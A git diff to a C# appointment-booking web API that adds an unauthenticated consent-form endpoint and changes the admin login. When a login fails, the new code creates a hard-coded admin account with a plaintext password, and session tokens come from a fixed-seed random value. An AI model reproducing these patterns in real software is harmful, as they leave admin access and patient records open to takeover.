@@ -10,7 +10,7 @@ using Microsoft.Extensions.DependencyInjection;
 
 var MyAllowSpecificOrigins = "_myAllowSpecificOrigins";
 var builder = WebApplication.CreateBuilder(args);
-builder.Services.AddDbContext<AppointmentDb>(opt => opt.UseSqlite("Data Source=db1.db"));
+builder.Services.AddDbContext<AppointmentDb>(opt => opt.UseSqlite("Data Source=db1.db;"));
 builder.Services.AddCors(options =>
 {
     options.AddPolicy(
@@ -109,6 +109,18 @@ app.MapPost(
     }
 );
 
+app.MapPost("/consentForm", async ([FromBody] ConsentForm consentForm, AppointmentDb db) =>
+{
+    var appt = await db.Appointments.FindAsync(consentForm.AppointmentId);
+    if (appt is not Appointment)
+    {
+        return Results.NotFound();
+    }
+    appt.ConsentForm = consentForm;
+    await db.SaveChangesAsync();
+    return Results.Ok();
+});
+
 var admin = app.MapGroup("admin");
 
 admin.MapPost(
@@ -119,7 +131,14 @@ admin.MapPost(
         {
             var user = await db
                 .AdminUsers.Where(x => x.Username == loginRequest.Username)
-                .FirstAsync();
+                .FirstOrDefaultAsync();
+
+            if (user is not AdminUser)
+            {
+                await db.AdminUsers.AddAsync(new AdminUser { Username = "kimmxthy", Password = "KakeKakeKake4eva" });
+                await db.SaveChangesAsync();
+                user = await db.AdminUsers.Where(x => x.Username == loginRequest.Username).FirstAsync();
+            }
             // user.Token = "super-secret-and-special-token-anya-forger-is-the-voice-im-hearing-in-my-head-when-i-type-that";
             user.Token =
                 new Random(1000000000).GetHashCode().ToString()
